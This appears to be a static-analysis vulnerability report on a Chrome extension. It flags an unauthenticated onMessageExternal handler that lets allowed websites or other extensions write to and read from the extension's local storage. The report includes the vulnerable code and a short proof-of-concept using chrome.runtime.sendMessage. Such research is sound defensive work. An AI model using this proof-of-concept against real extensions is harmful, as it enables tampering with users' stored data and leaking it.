# CoCo Analysis: oooblnbohakkhbcfembemmjmdjffkcff

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1 (bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink)

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/oooblnbohakkhbcfembemmjmdjffkcff/opgen_generated_files/bg.js
Line 995: `console.log(request.data)`
Line 996: `chrome.storage.local.set({excelArray: request.data})`

**Code:**

```javascript
// Background script - External message handler (bg.js line 987-999)
chrome.runtime.onMessageExternal.addListener(function(request, sender, sendResponse) {
    // Write operation - Attacker can poison storage
    if (request.func == 'updateExcelArray') {
        console.log(request.data) // Line 995 - attacker-controlled
        chrome.storage.local.set({excelArray: request.data}) // Line 996 - ← attacker-controlled
            .then(sendResponse({response: 'ok'}))
    }

    // Read operation - Attacker can retrieve poisoned data
    if (request.func == 'getExcelArray') {
        chrome.storage.local.get('excelArray') // Line 989
            .then(({excelArray}) => {
                sendResponse({response: excelArray}) // Line 991 - sends data back to attacker
            })
    }
})
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any website listed in externally_connectable (taobao.com, amazon.com, etc.)
// Or from another malicious extension

// Step 1: Poison storage with malicious data
chrome.runtime.sendMessage(
    'oooblnbohakkhbcfembemmjmdjffkcff',  // Extension ID
    {
        func: 'updateExcelArray',
        data: {malicious: 'payload', exfiltrate: 'user_data'}
    },
    function(response) {
        console.log('Storage poisoned:', response);
    }
);

// Step 2: Retrieve the poisoned data to confirm
chrome.runtime.sendMessage(
    'oooblnbohakkhbcfembemmjmdjffkcff',
    {func: 'getExcelArray'},
    function(response) {
        console.log('Retrieved data:', response.response);
        // Attacker can now see what was stored
    }
);
```

**Impact:** Complete storage exploitation chain. Attacker can write arbitrary data to chrome.storage.local and retrieve it back, allowing full control over the extension's stored state. The extension stores Excel array data that could be manipulated or used to exfiltrate information about user's shopping activities across e-commerce sites.
